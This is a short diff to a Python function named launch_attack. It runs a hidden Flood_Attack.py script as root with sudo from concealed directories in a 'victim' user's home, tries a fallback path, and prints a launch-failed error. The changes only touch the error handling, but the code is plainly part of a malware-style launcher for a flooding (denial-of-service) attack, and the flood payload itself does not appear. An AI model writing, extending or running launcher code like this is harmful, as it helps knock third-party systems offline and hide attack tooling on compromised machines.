@@ -4,13 +4,11 @@ import os
 def launch_attack():
     try:
         os.system('sudo /usr/bin/python /home/victim/.etc/.module/Flood_Attack.py')
-    except OSError as e:
-        print(e)
-
+    except:
         try:
             os.system('sudo /usr/bin/python /home/victim/.var/.module/Flood_Attack.py')
-        except OSError as e:
-            print(e)
+        except:
+            print('[ERROR] Launch attack failed.')
 
     return
 
